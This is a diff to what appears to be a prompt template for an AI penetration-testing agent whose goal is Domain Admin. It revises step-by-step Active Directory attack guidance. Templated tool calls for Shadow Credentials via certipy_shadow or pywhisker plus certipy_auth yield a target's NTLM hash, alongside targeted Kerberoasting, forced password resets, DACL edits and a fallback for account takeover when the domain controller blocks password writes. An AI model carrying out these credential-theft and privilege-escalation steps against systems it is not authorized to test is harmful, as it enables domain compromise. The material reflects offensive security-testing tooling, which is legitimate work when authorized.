@@ -28,7 +28,7 @@ given reaches Domain Admin.
    - If missing, request BloodHound analysis from recon/orchestrator
 
 2. **ACL Exploitation**
-   - Shadow Credentials (pywhisker) - BEST option
+   - Shadow Credentials (certipy_shadow, or pywhisker + certipy_auth) - BEST option
    - Targeted Kerberoasting (targeted_kerberoast)
    - Password reset (bloodyad_set_password)
    - DACL modification (dacl_edit)
@@ -44,6 +44,15 @@ given reaches Domain Admin.
 When you have these permissions on a user/computer:
 
 1. **Shadow Credentials** (BEST - one step to hash)
+   ```
+   certipy_shadow(target="targetuser", domain="{{ target_domain }}", username="user", dc_ip="{{ target_dc_ip }}")
+   → NTLM hash of targetuser
+   ```
+   Prefer this: certipy writes the msDS-KeyCredentialLink and completes PKINIT
+   in a single call, so there is no PFX to carry between calls.
+
+   The pywhisker route is the fallback when certipy_shadow fails, and it is
+   always two calls:
    ```
    pywhisker(target_samaccountname="targetuser", domain="{{ target_domain }}", username="user", password="pass", dc_ip="{{ target_dc_ip }}")
    certipy_auth(pfx_path="<path from the 'Saved PFX' line>", domain="{{ target_domain }}", dc_ip="{{ target_dc_ip }}")
@@ -82,8 +91,9 @@ signing / channel-binding / LDAPS-required error, do not retry the password
 write — the DC is refusing password modification on that channel. Take the
 account over without writing a password instead:
 ```
-certipy_shadow(account="user")  → NT hash via msDS-KeyCredentialLink
-pywhisker(target="user", action="add")  → PFX for PKINIT
+certipy_shadow(target="targetuser", domain="{{ target_domain }}", username="user", dc_ip="{{ target_dc_ip }}")
+  → NT hash via msDS-KeyCredentialLink, in one call
+pywhisker(target_samaccountname="targetuser", action="add")  → PFX for PKINIT, then certipy_auth
 ```
 Both need the same write access you already hold and are unaffected by the
 DC's password-modify policy.
